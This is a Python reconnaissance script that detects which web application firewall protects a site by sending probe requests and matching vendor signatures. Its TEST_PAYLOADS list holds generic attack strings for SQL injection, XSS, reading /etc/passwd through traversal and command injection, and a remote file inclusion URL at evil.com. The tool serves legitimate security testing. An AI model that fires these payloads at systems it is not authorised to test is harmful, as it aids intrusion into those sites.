"""
Script Name: WAFDetector.py
Author: Justin Andrews
Version: 1.0
Date: 2024-03-19

Description:
    This script detects the presence and type of Web Application Firewalls (WAF) on target websites
    by analyzing response patterns to various test requests. It utilizes the Utils.py classes for
    web interaction, logging, and thread management.

Arguments:
    url                 Target URL to scan for WAF
    -t, --threads      Number of threads for parallel testing (default: 5)
    --timeout          Request timeout in seconds (default: 10)
    -d, --debug        Enable debug output
    -l, --logging      Enable logging to file
    --user-agent       Custom User-Agent string

Usage:
    Basic scan:
        python WAFDetector.py http://example.com

    With custom options:
        python WAFDetector.py http://example.com -t 10 --timeout 15 -d -l

Example:
    python WAFDetector.py https://example.com -d -l --timeout 20

GUI Parameters Start:
"url": ""
"threads": 5
"timeout": 10
"debug": false
"logging": false
"user_agent": ""
"persistent": false
GUI Parameters End:
"""

import sys
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin
import re
from Utils import LoggingPipeline, ArgumentHandler, WebDriver, Threading

# WAF detection signatures
WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "__cfduid"],
        "response_codes": [403, 503],
        "response_patterns": [
            r"cloudflare",
            r"<title>.*?cloudflare</title>",
            r"ray-id",
        ],
    },
    "Akamai": {
        "headers": ["x-akamai-transformed", "akamai-origin-hop"],
        "response_codes": [403, 406],
        "response_patterns": [r"akamai", r"ak-security"],
    },
    "AWS WAF": {
        "headers": ["x-amzn-requestid", "x-amz-cf-id", "x-amz-id"],
        "response_codes": [403, 405],
        "response_patterns": [r"aws-waf", r"awselb"],
    },
    "ModSecurity": {
        "headers": ["mod_security", "mod_security_crs"],
        "response_codes": [403, 406],
        "response_patterns": [r"mod_security", r"not_acceptable"],
    },
    "Imperva": {
        "headers": ["x-iinfo", "x-cdn"],
        "response_codes": [403],
        "response_patterns": [r"imperva", r"incapsula", r"_incap_"],
    },
    "F5 BIG-IP ASM": {
        "headers": ["x-cnection", "x-wa-info"],
        "response_codes": [403, 501],
        "response_patterns": [r"bigip", r"f5-trace-id"],
    },
    "Fortinet": {
        "headers": ["fortigate", "fortiweb"],
        "response_codes": [403, 404],
        "response_patterns": [r"forti(gate|web)", r"forticdn"],
    },
}

# Test payloads designed to trigger WAF responses
TEST_PAYLOADS = [
    {
        "name": "SQL Injection",
        "payload": "' OR '1'='1",
        "path": "/search?q=",
    },
    {
        "name": "XSS",
        "payload": "<script>alert(1)</script>",
        "path": "/search?q=",
    },
    {
        "name": "Directory Traversal",
        "payload": "../../../etc/passwd",
        "path": "/",
    },
    {
        "name": "Command Injection",
        "payload": "; cat /etc/passwd",
        "path": "/search?cmd=",
    },
    {
        "name": "File Inclusion",
        "payload": "http://evil.com/shell.php",
        "path": "/include?file=",
    },
]


class WAFDetector:
    """Main class for WAF detection operations."""

    def __init__(
        self,
        url: str,
        threads: int = 5,
        timeout: int = 10,
        debug: bool = False,
        logging: bool = False,
        user_agent: Optional[str] = None,
    ):
        """Initialize WAF detector with logging and web interaction support."""
        self.url = url
        self.threads = threads
        self.timeout = timeout
        
        self.logger = LoggingPipeline(
            debug=debug, logging=logging, log_name="waf_detector"
        )
        
        self.thread_manager = Threading(debug=debug, logging=logging)
        
        # Initialize web driver with custom options
        try:
            self.driver = WebDriver(
                url=url,
                headless=True,
                debug=debug,
                logging=logging,
                page_load_timeout=timeout,
            )
            if user_agent:
                self.driver.driver.execute_cdp_cmd(
                    'Network.setUserAgentOverride', {"userAgent": user_agent}
                )
                
        except Exception as e:
            self.logger.append_log(f"Failed to initialize WebDriver: {str(e)}", "ERROR")
            raise

    def _analyze_response(
        self, response_headers: Dict[str, str], response_content: str, status_code: int
    ) -> List[str]:
        """
        Analyze response for WAF signatures.

        Args:
            response_headers: Response headers to analyze
            response_content: Response content to analyze
            status_code: HTTP status code

        Returns:
            List[str]: List of detected WAF names
        """
        detected_wafs = []

        # Convert headers to lowercase for case-insensitive comparison
        headers_lower = {k.lower(): v for k, v in response_headers.items()}

        for waf_name, signatures in WAF_SIGNATURES.items():
            # Check headers
            for header in signatures["headers"]:
                if any(header.lower() in h for h in headers_lower.keys()):
                    detected_wafs.append(waf_name)
                    break

            # Check status codes
            if status_code in signatures["response_codes"]:
                if waf_name not in detected_wafs:
                    detected_wafs.append(waf_name)

            # Check response patterns
            for pattern in signatures["response_patterns"]:
                if re.search(pattern, response_content, re.IGNORECASE):
                    if waf_name not in detected_wafs:
                        detected_wafs.append(waf_name)
                    break

        return detected_wafs

    def _test_payload(self, payload: Dict[str, str]) -> Dict[str, Any]:
        """
        Test a single payload against the target.

        Args:
            payload: Dictionary containing payload information

        Returns:
            Dict[str, Any]: Test results including detected WAFs
        """
        test_url = urljoin(self.url, payload["path"] + payload["payload"])
        self.logger.append_log(f"Testing payload: {payload['name']}", "DEBUG")

        try:
            # Navigate to test URL
            self.driver.navigate(test_url)
            
            # Get response details
            headers = {}
            for entry in self.driver.execute_script(
                "return performance.getEntries()"
            ):
                if hasattr(entry, 'responseHeaders'):
                    headers.update(entry.responseHeaders)

            status_code = self.driver.execute_script(
                "return window.performance.getEntries()[0].responseStatus"
            ) or 200
            
            content = self.driver.get_page_source()

            # Analyze response
            detected = self._analyze_response(headers, content, status_code)

            result = {
                "payload": payload["name"],
                "url": test_url,
                "status_code": status_code,
                "detected_wafs": detected,
            }

            if detected:
                self.logger.append_log(
                    f"WAF detected with {payload['name']}: {', '.join(detected)}",
                    "SUCCESS",
                )
            else:
                self.logger.append_log(
                    f"No WAF detected with {payload['name']}", "DEBUG"
                )

            return result

        except Exception as e:
            self.logger.append_log(
                f"Error testing payload {payload['name']}: {str(e)}", "ERROR"
            )
            return {
                "payload": payload["name"],
                "url": test_url,
                "error": str(e),
                "detected_wafs": [],
            }

    def detect(self) -> Dict[str, Any]:
        """
        Perform WAF detection using multiple test payloads.

        Returns:
            Dict[str, Any]: Detection results including all findings
        """
        self.logger.start_section("WAF Detection")
        self.logger.append_log(f"Starting WAF detection on {self.url}", "INFO")

        try:
            # Test baseline response first
            self.logger.append_log("Testing baseline response", "DEBUG")
            baseline = self._test_payload({"name": "Baseline", "payload": "", "path": "/"})

            # Run payload tests in parallel
            self.logger.append_log(
                f"Running {len(TEST_PAYLOADS)} tests using {self.threads} threads",
                "INFO",
            )
            results = self.thread_manager.map_threaded(
                self._test_payload, TEST_PAYLOADS, threads=self.threads
            )

            # Combine all detected WAFs
            all_detected = set(baseline.get("detected_wafs", []))
            for result in results:
                all_detected.update(result.get("detected_wafs", []))

            detection_results = {
                "url": self.url,
                "detected_wafs": list(all_detected),
                "confidence": self._calculate_confidence(results),
                "baseline": baseline,
                "test_results": results,
            }

            return detection_results

        except Exception as e:
            self.logger.append_log(f"Detection failed: {str(e)}", "ERROR")
            raise
        finally:
            self.cleanup()

    def _calculate_confidence(self, results: List[Dict[str, Any]]) -> Dict[str, float]:
        """
        Calculate confidence scores for detected WAFs.

        Args:
            results: List of test results

        Returns:
            Dict[str, float]: WAF names mapped to confidence scores
        """
        confidence_scores = {}
        total_tests = len(results)

        # Count detections for each WAF
        waf_counts = {}
        for result in results:
            for waf in result.get("detected_wafs", []):
                waf_counts[waf] = waf_counts.get(waf, 0) + 1

        # Calculate confidence scores
        for waf, count in waf_counts.items():
            confidence_scores[waf] = (count / total_tests) * 100

        return confidence_scores

    def print_results(self, results: Dict[str, Any]) -> None:
        """
        Print formatted detection results.

        Args:
            results: Detection results to print
        """
        self.logger.start_section("Detection Results")

        if not results.get("detected_wafs"):
            self.logger.append_log("No WAF detected", "WARNING")
            return

        # Print summary
        summary = [
            f"\nTarget URL: {results['url']}",
            f"{'=' * 80}",
            f"\nDetected WAFs:",
        ]

        for waf in results["detected_wafs"]:
            confidence = results["confidence"].get(waf, 0)
            summary.append(f"  - {waf} (Confidence: {confidence:.1f}%)")

        # Print test details
        summary.extend(["\nTest Details:", f"{'-' * 20}"])
        for test in results["test_results"]:
            if test.get("error"):
                summary.append(
                    f"\nTest: {test['payload']}\n"
                    f"Status: Error - {test['error']}"
                )
            else:
                summary.append(
                    f"\nTest: {test['payload']}\n"
                    f"Status Code: {test['status_code']}\n"
                    f"Detected: {', '.join(test['detected_wafs']) if test['detected_wafs'] else 'None'}"
                )

        for line in summary:
            self.logger.append_log(line, "SUCCESS")

    def cleanup(self) -> None:
        """Clean up resources."""
        if self.driver:
            self.driver.cleanup()
            self.logger.append_log("Resources cleaned up", "DEBUG")
        self.logger.generate_log()


def main():
    # Define argument configuration
    arg_config = {
        "script": {
            "name": "WAFDetector.py",
            "description": "Web Application Firewall Detection Utility",
        },
        "args": {
            "url": {"help": "Target URL to scan", "positional": True},
            "threads": {
                "flag": "-t",
                "type": int,
                "default": 5,
                "help": "Number of threads to use",
            },
            "timeout": {
                "flag": "--timeout",
                "type": int,
                "default": 10,
                "help": "Request timeout in seconds",
            },
            "debug": {
                "flag": "-d",
                "action": "store_true",
                "help": "Enable debug output",
            },
            "logging": {
                "flag": "-l",
                "action": "store_true",
                "help": "Enable logging to file",
            },
            "user_agent": {
                "flag": "--user-agent",
                "help": "Custom User-Agent string",
            },
        },
    }

    # Parse arguments
    arg_handler = ArgumentHandler(arg_config)
    args = arg_handler.parse_args()

    # Initialize and run detector
    detector = None
    try:
        detector = WAFDetector(
            url=args.url,
            threads=args.threads,
            timeout=args.timeout,
            debug=args.debug,
            logging=args.logging,
            user_agent=args.user_agent,
        )

        # Run detection
        results = detector.detect()

        # Print results
        detector.print_results(results)

    except Exception as e:
        if detector and detector.logger:
            detector.logger.append_log(f"Fatal error: {str(e)}", "ERROR")
            if args.debug:
                import traceback
                detector.logger.append_log(traceback.format_exc(), "ERROR")
        sys.exit(1)

    finally:
        if detector:
            detector.cleanup()


if __name__ == "__main__":
    main()